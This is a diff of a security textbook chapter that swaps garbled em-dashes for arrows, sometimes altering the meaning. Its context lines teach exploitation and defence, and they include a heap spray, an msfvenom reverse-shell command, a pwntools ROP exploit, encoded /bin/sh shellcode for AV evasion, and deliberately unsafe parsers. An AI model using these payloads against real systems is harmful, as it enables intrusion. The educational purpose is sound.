 4. **PE analysis:** PEStudio checks imports (VirtualAlloc, CreateRemoteThread), entropy (packed?), TLS callbacks, sections
 5. **Disassembly:** Ghidra or IDA Free for decompilation
@@ -2033,9 +2033,9 @@ The Morris Worm (1988) is the classic example of a worm: it propagated via finge
 **A:** The SolarWinds attack exploited failures across multiple SSDLC phases:
 
 - **Requirements/Design:** SolarWinds did not treat their build environment as a critical security boundary. No zero-trust architecture for the build pipeline.
-- **Implementation:** The build environment lacked file integrity monitoring â€” attackers modified source code without detection for months.
+- **Implementation:** The build environment lacked file integrity monitoring → attackers modified source code without detection for months.
 - **Testing:** Trojanized DLL passed all SolarWinds QA/QC because it worked correctly. No behavioral analysis or anomaly detection in test phase.
-- **Deployment:** Code signing didn't help â€” the trojanized DLL was signed with SolarWinds' legitimate certificate.
+- **Deployment:** Code signing didn't help → the trojanized DLL was signed with SolarWinds' legitimate certificate.
 - **Maintenance:** No runtime monitoring of the Orion agent's outbound traffic (blended in with telemetry).
 - **Key lesson:** Supply chain security requires verifying not just the vendor's identity but the integrity of their entire build and delivery pipeline.
 
@@ -2068,7 +2068,7 @@ AAAAffffd500.f7f5f5c0.8048426.41414141    â† AAAA = 0x41414141 leaked from 
 | **TCPView** | Network connections for each process |
 | **Handle** | Open handles by process |
 
-**Workflow:** Autoruns â†’ identify persistence â†’ ProcMon â†’ capture behavior â†’ TCPView â†’ C2 destinations â†’ Strings/Sigcheck â†’ in-depth binary analysis.
+**Workflow:** Autoruns → identify persistence → ProcMon → capture behavior → TCPView → C2 destinations → Strings/Sigcheck → in-depth binary analysis.
 
 ---
 
@@ -2080,7 +2080,7 @@ AAAAffffd500.f7f5f5c0.8048426.41414141    â† AAAA = 0x41414141 leaked from 
 | **Linux Kernel** | Kernel Self-Protection Project (KSPP) | Stack canaries, FREECON, usercopy hardening |
 | **Browser Security** | Chrome Site Isolation + V8 Sandbox | ASLR + DEP + CFI to prevent ROP in JavaScript engines |
 | **Cloud Security** | AWS Nitro Enclaves | Memory isolation, attestation, minimal attack surface |
-| **Embedded Systems** | TPM Measured Boot | Boot chain integrity (UEFI Secure Boot â†’ OS loader â†’ kernel) |
+| **Embedded Systems** | TPM Measured Boot | Boot chain integrity (UEFI Secure Boot → OS loader → kernel) |
 | **AV/EDR** | CrowdStrike Falcon | Behavioral detection, memory scanning for shellcode signatures |
 | **IoT Security** | Azure Sphere Pluton security core | Hardware-isolated execution, measured boot, signed updates |
 | **Database Security** | SQL Server Always Encrypted | In-enclave decryption, encrypted memory regions |
@@ -2289,7 +2289,7 @@ AAAAffffd500.f7f5f5c0.8048426.41414141    â† AAAA = 0x41414141 leaked from 
 
 ---
 
-*End of Chapter 4 â€” System & Software Security*
+*End of Chapter 4 → System & Software Security*
 <!-- This file contains additional content merged into the main file via concatenation -->
 
 ---
@@ -2311,7 +2311,7 @@ while (spray.length < 500) {
     spray.push(nop_sled + shellcode);  // allocate sprayed blocks
 }
 // Now trigger a heap corruption that dereferences a
-// heap pointer â€” it will likely land in one of the sprayed blocks
+// heap pointer → it will likely land in one of the sprayed blocks
 ```
 
 **Defense:** ASLR randomizes heap base; heap isolation separates different types of objects.
@@ -2362,7 +2362,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c
 
 ### Q17: Explain return-to-libc and when you would use it over a full ROP chain.
 
-**A:** Return-to-libc (ret2libc) redirects execution to a single libc function â€” typically `system("/bin/sh")`. The stack layout is:
+**A:** Return-to-libc (ret2libc) redirects execution to a single libc function → typically `system("/bin/sh")`. The stack layout is:
 
 ```
 [ padding ][ &system() ][ fake_ret_addr ][ &"/bin/sh" ]
@@ -2384,14 +2384,14 @@ Use full ROP when:
 **A:** Detection techniques in order of increasing reliability:
 
 ```bash
-# 1. Userland checks (unreliable â€” rootkit hooks these)
+# 1. Userland checks (unreliable → rootkit hooks these)
 lsmod          # may be hooked to hide modules
 ps aux         # may be hooked to hide processes
 netstat -tlnp  # may be hooked to hide ports
 
 # 2. Cross-view detection (compare /proc with syscall results)
-cat /proc/modules     # vs lsmod â€” discrepancy indicates hooking
-cat /proc/net/tcp     # vs netstat â€” port hiding detection
+cat /proc/modules     # vs lsmod → discrepancy indicates hooking
+cat /proc/net/tcp     # vs netstat → port hiding detection
 
 # 3. Known rootkit scanners
 chkrootkit
@@ -2427,12 +2427,12 @@ rpm -Va             # RHEL/CentOS
 
 **Original flow:**
 ```
-Step 7 â†’ s7otbxdx.dll â†’ MPI/Profibus â†’ PLC â†’ Frequency Converter â†’ Centrifuge
+Step 7 → s7otbxdx.dll → MPI/Profibus → PLC → Frequency Converter → Centrifuge
 ```
 
 **Stuxnet-modified flow:**
 ```
-Step 7 â†’ STUXNET s7otbxdx.dll â†’ [interceptor] â†’ PLC â†’ [modified values] â†’ Centrifuge
+Step 7 → STUXNET s7otbxdx.dll → [interceptor] → PLC → [modified values] → Centrifuge
 
 Interception logic:
 1. READ from PLC: intercept the read call
@@ -2448,10 +2448,10 @@ Interception logic:
 ```
 
 **PLC payload components:**
-- **DP_RECV hook** â€” intercepted Profibus communication at the PLC level
-- **OB1 (Organization Block 1) modification** â€” PLC main cycle modified
-- **FC1865/FC1866** â€” malicious function blocks injected into PLC
-- **Attack thresholds** â€” specific to centrifuge rotor frequencies (1,064 Hz / 1,410 Hz)
+- **DP_RECV hook** → intercepted Profibus communication at the PLC level
+- **OB1 (Organization Block 1) modification** → PLC main cycle modified
+- **FC1865/FC1866** → malicious function blocks injected into PLC
+- **Attack thresholds** → specific to centrifuge rotor frequencies (1,064 Hz / 1,410 Hz)
 
 This was the first known malware to cause physical destruction by manipulating industrial control processes.
 
@@ -2516,7 +2516,7 @@ public class SecureXMLParser {
     public static Document parseXMLSafe(String xmlContent) throws Exception {
         DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
 
-        // XXE mitigations â€” OWASP recommended
+        // XXE mitigations → OWASP recommended
         factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
         factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
         factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
@@ -2528,10 +2528,10 @@ public class SecureXMLParser {
         return builder.parse(new ByteArrayInputStream(xmlContent.getBytes()));
     }
 
-    // Unsafe parser â€” susceptible to XXE
+    // Unsafe parser → susceptible to XXE
     public static Document parseXMLUnsafe(String xmlContent) throws Exception {
         DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
-        // All features are default â€” XXE attacks work
+        // All features are default → XXE attacks work
         DocumentBuilder builder = factory.newDocumentBuilder();
         return builder.parse(new ByteArrayInputStream(xmlContent.getBytes()));
     }
@@ -2561,7 +2561,7 @@ public class SecureFileAccess {
         return Files.readString(canonicalPath);
     }
 
-    // UNSAFE version â€” vulnerable to ../../../etc/passwd
+    // UNSAFE version → vulnerable to ../../../etc/passwd
     public static String readFileUnsafe(String filename) throws IOException {
         return Files.readString(Paths.get(BASE_DIR + filename));
     }
@@ -2571,7 +2571,7 @@ public class SecureFileAccess {
 ### JavaScript: Prototype Pollution Prevention
 
 ```javascript
-// UNSAFE â€” prototype pollution vulnerability
+// UNSAFE → prototype pollution vulnerability
 function merge(target, source) {
     for (let key in source) {
         if (source.hasOwnProperty(key)) {
@@ -2581,7 +2581,7 @@ function merge(target, source) {
     return target;
 }
 
-// SAFE â€” filter out dangerous keys
+// SAFE → filter out dangerous keys
 function safeMerge(target, source) {
     const DANGEROUS_KEYS = ['__proto__', 'constructor', 'prototype'];
 
@@ -2596,7 +2596,7 @@ function safeMerge(target, source) {
     return target;
 }
 
-// SAFER â€” use Object.assign with null prototype
+// SAFER → use Object.assign with null prototype
 function saferMerge(target, source) {
     const clean = Object.create(null);  // no __proto__ at all
     const DANGEROUS_KEYS = ['__proto__', 'constructor', 'prototype'];
@@ -2669,7 +2669,7 @@ function backupUser_safer(username) {
 
 ```python
 #!/usr/bin/env python3
-# exploit.py â€” Full ROP exploitation for a 64-bit ASLR + NX binary
+# exploit.py → Full ROP exploitation for a 64-bit ASLR + NX binary
 # Target binary has: no PIE (fixed .text), but ASLR and NX enabled.
 # Vulnerability: format string for info leak + gets() for overflow.
 from pwn import *
@@ -2682,7 +2682,7 @@ libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 puts_plt = elf.plt['puts']
 puts_got = elf.got['puts']
 main_addr = elf.symbols['main']
-pop_rdi = 0x4012b3  # pop rdi; ret â€” from binary
+pop_rdi = 0x4012b3  # pop rdi; ret → from binary
 
 def exploit():
     # ============ STAGE 1: Leak libc address via puts(puts@GOT) ============
@@ -2760,7 +2760,7 @@ sequenceDiagram
 ## Extended Fuzzing: libFuzzer Example
 
 ```c
-// fuzz_target.c â€” compile with clang -fsanitize=fuzzer,address -o fuzz_target fuzz_target.c
+// fuzz_target.c → compile with clang -fsanitize=fuzzer,address -o fuzz_target fuzz_target.c
 #include <stdint.h>
 #include <stddef.h>
 #include <string.h>
@@ -2848,7 +2848,7 @@ _start:
     mov eax, [eax + 0x10]        ; kernel32 base address
 
     ; Find GetProcAddress in kernel32 export table
-    ; (simplified â€” full implementation walks PE export directory)
+    ; (simplified → full implementation walks PE export directory)
     ; ...
 
     ; Call MessageBoxA
@@ -3015,7 +3015,7 @@ sigcheck -a -h suspicious.exe
 # Description:  <none>
 # File Version: 1.0.0.0
 # Original Name: NOT suspicious.exe (should match filename)
-# Entropy:  7.98 (HIGH â€” packed/encrypted)
+# Entropy:  7.98 (HIGH → packed/encrypted)
 
 # ============ STEP 3: String Analysis ============
 # Sysinternals Strings
@@ -3072,12 +3072,12 @@ Check these PEStudio indicators:
 
 | # | Edge Case | Behavior | Exploitation Impact |
 |---|-----------|----------|---------------------|
-| 1 | Overflow of exactly 1 byte past buffer | Overwrites lowest byte of saved EBP â€” triggers stack frame shift ("EBP off-by-one" or "poisoned null byte") | Can redirect frame pointer to controlled stack area |
+| 1 | Overflow of exactly 1 byte past buffer | Overwrites lowest byte of saved EBP → triggers stack frame shift ("EBP off-by-one" or "poisoned null byte") | Can redirect frame pointer to controlled stack area |
 | 2 | Buffer allocated on heap with function pointer after it | Overflow corrupts function pointer, not return address | No stack canary protection; arbitrary call on next fnptr dereference |
 | 3 | Unicode/wide character overflow | `wcscpy` copies 2-byte characters; overflow measured in wchar_t units | Different offset calculation; may embed null bytes differently |
 | 4 | Stack clash (CVE-2017-1000364) | Stack grows into another memory region (heap/mmap) | Bypasses guard page; heap areas become stack-contiguous |
 | 5 | Variable-length array (VLA) on stack | Array size computed at runtime from user input | Can allocate massive stack frames; smash the stack without strcpy |
-| 6 | Alloca with negative value | `alloca(-1)` acts as `alloca(0xFFFFFFFF)` â€” wraps and allocates tiny buffer | Massive overflow on subsequent write |
+| 6 | Alloca with negative value | `alloca(-1)` acts as `alloca(0xFFFFFFFF)` → wraps and allocates tiny buffer | Massive overflow on subsequent write |
 | 7 | Off-by-one null byte (as in glibc malloc) | `strncpy` leaves buffer non-null-terminated if source >= n; subsequent `strlen` reads beyond | Information leak via adjacent memory |
 | 8 | sigaltstack overflow | Overflows alternate signal stack (sigaltstack) | Corrupts signal handler frame; can hijack execution during signal delivery |
 
@@ -3101,12 +3101,12 @@ Check these PEStudio indicators:
 ### NOP Sled Variations
 
 ```nasm
-; Standard NOP (0x90) â€” easily signatured
+; Standard NOP (0x90) → easily signatured
 nop
 
 ; Multi-byte NOP equivalents (AV/IDS evasion)
-xchg eax, eax     ; 0x87 0xC0 â€” does nothing (same as NOP on most CPUs)
-mov eax, eax      ; 0x89 0xC0 â€” no-op
+xchg eax, eax     ; 0x87 0xC0 → does nothing (same as NOP on most CPUs)
+mov eax, eax      ; 0x89 0xC0 → no-op
 
 ; Using lea as NOP (common in compiler output)
 lea esi, [esi]    ; 0x8D 0x36
@@ -3118,8 +3118,8 @@ xchg eax, edx     ; 0x92
 xchg eax, ebx     ; 0x93
 
 ; Random NOP-like instructions (for polymorphic sleds)
-inc ecx           ; 0x41 â€” changes ecx but if ecx not used, harmless
-dec ecx           ; 0x49 â€” reverses inc
+inc ecx           ; 0x41 → changes ecx but if ecx not used, harmless
+dec ecx           ; 0x49 → reverses inc
 ```
 
 ### Shellcode Encoding with Custom XOR
@@ -3129,7 +3129,7 @@ dec ecx           ; 0x49 â€” reverses inc
 #include <stdint.h>
 #include <string.h>
 
-// Original shellcode: execve("/bin/sh", 0, 0) â€” 23 bytes
+// Original shellcode: execve("/bin/sh", 0, 0) → 23 bytes
 unsigned char shellcode[] = 
 "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
 "\x53\x68\x2f\x2f\x73\x68\x68\x2f"
@@ -3149,14 +3149,14 @@ void encode_xor(unsigned char *data, int len, unsigned char key) {
     }
 }
 
-// Decoder stub (assembly â€” prepended to encoded shellcode)
+// Decoder stub (assembly → prepended to encoded shellcode)
 unsigned char decoder_stub[] = 
-"\x5e"                    // pop esi â€” get address of encoded shellcode
-"\x31\xc9"                // xor ecx, ecx â€” counter
-"\xb1\x17"                // mov cl, 23 â€” length of shellcode
-"\x80\x34\x0e\xaa"        // xor byte [esi+ecx], 0xaa â€” XOR decode with 0xAA
+"\x5e"                    // pop esi → get address of encoded shellcode
+"\x31\xc9"                // xor ecx, ecx → counter
+"\xb1\x17"                // mov cl, 23 → length of shellcode
+"\x80\x34\x0e\xaa"        // xor byte [esi+ecx], 0xaa → XOR decode with 0xAA
 "\xe2\xfa"                // loop back to decode
-"\xff\xe6"                // jmp esi â€” jump to decoded shellcode
+"\xff\xe6"                // jmp esi → jump to decoded shellcode
 ;
 
 int main() {
@@ -3223,7 +3223,7 @@ syscall; ret              ; Execute syscall (rax = number, rdi/rsi/rdx/r10/r8/r9
 
 ; ==================== STACK MANIPULATION ====================
 add rsp, 0x20; ret        ; Skip 4 stack slots
-leave; ret                ; mov rsp, rbp; pop rbp; ret â€” restore frame
+leave; ret                ; mov rsp, rbp; pop rbp; ret → restore frame
 ret                       ; Pop next address and jump
 
 ; ==================== LOOP/BRANCH ====================
@@ -3262,7 +3262,7 @@ import struct
 # If the ROP chain doesn't maintain alignment, system() crashes on movaps.
 
 # Solution: insert a bare "ret" gadget before the target call.
-# ret pops 8 bytes â†’ stack pointer advances 8 â†’ alignment restored.
+# ret pops 8 bytes → stack pointer advances 8 → alignment restored.
 
 ret_addr = 0x400101  # address of a "ret" instruction
 
@@ -3314,8 +3314,8 @@ foreach ($proc in $processes) {
         }
     }
     catch {
-        # Access denied â€” possible rootkit hiding modules
-        Write-Warning "Cannot access modules for $($proc.Name) â€” possible hooking"
+        # Access denied → possible rootkit hiding modules
+        Write-Warning "Cannot access modules for $($proc.Name) → possible hooking"
     }
 }
 ```
@@ -3327,7 +3327,7 @@ foreach ($proc in $processes) {
 # Even obfuscated scripts leave traces
 
 # Enable enhanced logging via GPO or registry:
-# HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging â†’ EnableScriptBlockLogging = 1
+# HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging → EnableScriptBlockLogging = 1
 
 # Query script block logs for suspicious patterns
 Get-WinEvent -FilterHashtable @{
@@ -3382,7 +3382,7 @@ Get-WinEvent -FilterHashtable @{
 # Check ASLR entropy on current system
 cat /proc/sys/kernel/randomize_va_space
 # 0 = ASLR off
-# 1 = Randomize stack, mmap, shared libraries (partial â€” PIE off)
+# 1 = Randomize stack, mmap, shared libraries (partial → PIE off)
 # 2 = Full randomization (stack, mmap, heap, PIE, vDSO)
 
 # View memory layout of a process
@@ -3431,13 +3431,13 @@ cat /proc/self/maps
 
 ### During Implementation
 
-- [ ] NEVER use `gets()` â€” use `fgets()` or `getline()`
-- [ ] NEVER use `strcpy()` â€” use `strncpy()` or `strlcpy()` (with explicit null-termination)
-- [ ] NEVER use `sprintf()` â€” use `snprintf()` with buffer size
-- [ ] NEVER use `scanf("%s")` â€” use `fgets()` + `sscanf()` with field width
+- [ ] NEVER use `gets()` → use `fgets()` or `getline()`
+- [ ] NEVER use `strcpy()` → use `strncpy()` or `strlcpy()` (with explicit null-termination)
+- [ ] NEVER use `sprintf()` → use `snprintf()` with buffer size
+- [ ] NEVER use `scanf("%s")` → use `fgets()` + `sscanf()` with field width
 - [ ] ALWAYS check `malloc()`/`calloc()` return for NULL
 - [ ] ALWAYS validate integer arithmetic before allocation (`size > SIZE_MAX - offset`)
-- [ ] ALWAYS null-terminate strings after `strncpy()` â€” it does NOT add null if source >= n
+- [ ] ALWAYS null-terminate strings after `strncpy()` → it does NOT add null if source >= n
 - [ ] ALWAYS check array bounds before access
 - [ ] ALWAYS set pointers to NULL after `free()`
 - [ ] NEVER pass user input as format string to `printf()`, `fprintf()`, `syslog()`
@@ -3475,7 +3475,7 @@ void bad4(char *input) {
 // BAD PATTERN 5: TOCTOU race
 void bad5(const char *path) {
     if (access(path, R_OK) == 0) {   // Check
-        FILE *f = fopen(path, "r");  // Use â€” path may have changed!
+        FILE *f = fopen(path, "r");  // Use → path may have changed!
         // FIX: open file first, then fstat() to verify
     }
 }
@@ -3508,7 +3508,7 @@ void bad6() {
 **PASTA example for a login component:**
 
 ```
-Stage 3: Decompose â€” Login Component
+Stage 3: Decompose → Login Component
   Entry points: POST /api/login, GET /api/session
   Trust boundary: DMZ / Internal network
   Assets: User credentials, session tokens, authentication database
@@ -3524,11 +3524,11 @@ Stage 6: Attack Modeling
   Attack Tree: SQL Injection on Login
   â””â”€â”€ OR
       â”œâ”€â”€ Username field with ' OR 1=1 --
-      â”‚   â”œâ”€â”€ Parameterized query? â†’ Blocked
-      â”‚   â””â”€â”€ String concatenation? â†’ Vulnerability!
+      â”‚   â”œâ”€â”€ Parameterized query? → Blocked
+      â”‚   â””â”€â”€ String concatenation? → Vulnerability!
       â””â”€â”€ Password field with admin' --
-          â”œâ”€â”€ Input validation? â†’ Blocked
-          â””â”€â”€ No validation? â†’ Vulnerability!
+          â”œâ”€â”€ Input validation? → Blocked
+          â””â”€â”€ No validation? → Vulnerability!
 
 Stage 7: Risk Scoring
   [SQL Injection on Login] Damage=10 Ã— Reproducibility=10 Ã— Exploitability=8
@@ -3601,7 +3601,7 @@ net.ipv4.tcp_syncookies = 1
 net.ipv4.tcp_syn_retries = 5
 net.ipv4.tcp_synack_retries = 2
 
-# Ignore ICMP echo requests (optional â€” disables ping)
+# Ignore ICMP echo requests (optional → disables ping)
 net.ipv4.icmp_echo_ignore_all = 1
 
 # Ignore broadcast ICMP (smurf attack mitigation)
@@ -3644,7 +3644,7 @@ kernel.perf_event_max_sample_rate = 1
 ### Windows: PowerShell Hardening Script
 
 ```powershell
-# Windows-Harden.ps1 â€” Run as Administrator
+# Windows-Harden.ps1 → Run as Administrator
 
 # ============ EXPLOIT PROTECTION ============
 # Windows Defender Exploit Protection settings
@@ -3702,7 +3702,7 @@ Write-Host "Hardening completed. Restart recommended."
 
 ---
 
-## Extended Malware Case Study: Emotet â€” Botnet Evolution
+## Extended Malware Case Study: Emotet → Botnet Evolution
 
 ### Emotet Technical Breakdown
 
@@ -3722,7 +3722,7 @@ Emotet evolved over 10+ years through multiple transformations:
 2. Response: Encrypted payload (DLL) loaded into regsvr32.exe
 3. Propagation: SMB brute-force + PsExec spread to network
 4. Persistence: Scheduled task or service + registry Run key
-5. Lateral movement: Steals Outlook contacts â†’ sends phishing emails
+5. Lateral movement: Steals Outlook contacts → sends phishing emails
 ```
 
 **Detection signature (Zeek/Suricata):**
@@ -3768,7 +3768,7 @@ EBP - 12                     (padding)              12 bytes
 EBP - 24                     buffer[11..0]          12 bytes
 EBP - 36                     buffer[23..12]         12 bytes
 EBP - 44                     buffer[31..24]         8 bytes
-ESP â†’                        buffer[0]              1 byte
+ESP →                        buffer[0]              1 byte
 ```
 
 **Stack layout AFTER overflow (100 bytes written into 32-byte buffer):**
@@ -3776,18 +3776,18 @@ ESP â†’                        buffer[0]              1 byte
 Address                     Content                  Source Offset
 +---------------------------+------------------------+--------------
 EBP + 8                     bytes 96-99              96-99 (input[96..99])
-EBP + 4                     bytes 92-95 (return)     92-95 â†’ EIP hijack!
+EBP + 4                     bytes 92-95 (return)     92-95 → EIP hijack!
 EBP + 0                     bytes 88-91 (EBP)        88-91
-EBP - 4                     bytes 84-87              84-87 â†’ safety overwritten
-EBP - 8                     bytes 80-83 (i)          80-83 â†’ loop counter corrupted
+EBP - 4                     bytes 84-87              84-87 → safety overwritten
+EBP - 8                     bytes 80-83 (i)          80-83 → loop counter corrupted
 EBP - 12                    bytes 68-79              68-79
 EBP - 24                    bytes 56-67              56-67
 EBP - 36                    bytes 44-55              44-55
 EBP - 44                    bytes 32-43              32-43
-ESP â†’                       bytes 0-31               0-31 (buffer)
+ESP →                       bytes 0-31               0-31 (buffer)
 ```
 
-**Key insight:** The `safety` variable (0xDEAD) sits between i and the saved EBP. A 36-byte overflow would overwrite it. A 40-byte overflow hits EBP. A 44-byte overflow hits the return address. But the loop runs to `< 100` â€” well past all of them.
+**Key insight:** The `safety` variable (0xDEAD) sits between i and the saved EBP. A 36-byte overflow would overwrite it. A 40-byte overflow hits EBP. A 44-byte overflow hits the return address. But the loop runs to `< 100` → well past all of them.
 
 ---
 
